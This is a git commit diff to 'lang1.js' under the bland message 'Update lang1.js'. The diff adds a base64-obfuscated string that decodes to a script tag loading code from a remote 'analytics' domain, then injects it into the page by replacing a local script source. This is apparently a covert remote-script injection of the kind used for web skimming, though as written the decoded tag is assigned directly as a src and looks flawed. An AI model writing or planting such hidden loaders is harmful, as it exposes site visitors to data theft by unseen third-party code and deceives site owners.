64405ce08a37ca065e4cb53aa614b627f0c1031d
version2 <57840254+version2@users.noreply.github.com>
2020-07-23 18:55:48 +0200

    Update lang1.js

--- lang1.js
+++ lang1.js
@@ -1,4 +1,10 @@
+var string = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8vYW5hbHl0aWNzLnNob3BzdGF0MS5jb20vZGF0ZWpzLmpzIj48L3NjcmlwdD4=';
+var decodedString = atob(string);
+
+
+
+
 var js = document.createElement('script');
-js.src = 'none1.js';
+js.src = ''+ decodedString +'';
 var first = document.getElementsByTagName('script')[0];
 first.parentNode.insertBefore(js, first);
